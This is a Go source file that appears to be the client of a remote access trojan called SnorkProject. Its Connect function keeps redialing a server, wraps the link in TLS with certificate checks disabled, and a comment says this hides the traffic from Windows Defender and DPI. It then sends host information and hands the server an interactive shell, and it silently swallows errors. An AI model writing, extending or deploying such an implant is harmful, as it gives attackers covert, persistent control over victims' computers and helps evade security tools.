package client

import (
	"crypto/tls"
	"errors"
	"fmt"
	"net"
	"time"

	"github.com/nb-322/SnorkProject/internal/system"
)

type Session struct {
	Conn        net.Conn
	CurrentPath string
}

func Connect(serverAddr string) error {
	defer func() {
		if r := recover(); r != nil {

		}
	}()
	if serverAddr == "" {
		return errors.New("serverAddr is empty")
	}
	for {
		tcpConn, err := net.Dial("tcp4", serverAddr)
		if err != nil {
			fmt.Println("Ошибка подключения, повтор через 5 сек...")
			time.Sleep(5 * time.Second)
			continue
		}

		// TCP keepalive до TLS-обёртки
		if tc, ok := tcpConn.(*net.TCPConn); ok {
			tc.SetKeepAlive(true)
			tc.SetKeepAlivePeriod(15 * time.Second)
		}

		// TLS-обёртка: шифруем трафик, Windows Defender/DPI его не видит
		conn := tls.Client(tcpConn, &tls.Config{InsecureSkipVerify: true})
		if err := conn.Handshake(); err != nil {
			fmt.Println("TLS handshake failed:", err)
			tcpConn.Close()
			time.Sleep(5 * time.Second)
			continue
		}

		err = system.SendClientInfo(conn)
		if err != nil {
			conn.Close()
			time.Sleep(5 * time.Second)
			continue
		}

		executor := NewExecutor()
		executor.RunShell(conn)

		conn.Close()

		time.Sleep(10 * time.Second)
	}
}
